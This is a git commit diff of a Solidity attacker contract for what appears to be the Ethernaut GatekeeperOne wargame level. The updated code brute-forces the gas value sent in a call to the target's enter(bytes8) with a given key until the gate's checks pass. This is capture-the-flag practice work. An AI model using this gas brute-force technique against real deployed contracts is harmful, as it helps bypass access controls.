bd5c9246fbaef7132010bdbd19deb637e6dfd9db
richuak <richuakuttikattu@gmail.com>
2024-01-16 19:15:45 +0300

    GateKeeperOne done

--- GatekeeperOne/EnterGateKeeperOne.sol
+++ GatekeeperOne/EnterGateKeeperOne.sol
@@ -1,19 +1,21 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity 0.8.0;
+pragma solidity ^0.8.0;
 
 contract EnterGateKeeper {
-    address gateKeeperAddress = 0x6Ec9109f3ED94d54Ee998539854be06BC70a3bfD;
-
-    bytes8 gateKey = 0x005e9ba00000fcdc;
-
     bytes public returnedData;
 
-    function youShallPass(uint256 _gas) public {
-        (bool success, bytes memory data) =
-            gateKeeperAddress.call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
-        if (!success) {
-            returnedData = data;
+    function youShallPass(bytes8 _gateKey, address _gateKeeperAddress) public {
+        for (uint256 i = 0; i < 8191; i++) {
+            (bool success,) =
+                _gateKeeperAddress.call{gas: i + 81910}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+            if (success) {
+                break;
+            }
         }
+        // (bool success, ) = _gateKeeperAddress.call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)",_gateKey));
+        // if(!success){
+        //     revert();
+        // }
     }
 }
